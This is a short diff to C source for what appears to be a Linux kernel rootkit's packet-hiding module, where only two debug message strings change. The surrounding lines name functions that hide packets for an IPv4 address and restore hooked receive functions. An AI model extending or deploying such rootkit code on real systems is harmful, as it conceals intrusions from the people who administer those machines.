@@ -228,7 +228,7 @@ load_packet_hiding (char *ipv4_addr)
 {
 	u8 dst[4];
         
-	ROOTKIT_DEBUG("Loading packet hiding... bye!\n");
+	ROOTKIT_DEBUG("Loading packet hiding...\n");
 
 	/* convert ip string to an int array */	
 	in4_pton(ipv4_addr, -1, dst, -1, NULL);
@@ -254,7 +254,7 @@ load_packet_hiding (char *ipv4_addr)
 void
 unload_packet_hiding (void)
 {
-	ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");
+	ROOTKIT_DEBUG("Unloading packet hiding...\n");
 
 	/* restore all three functions before unloading */
 	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
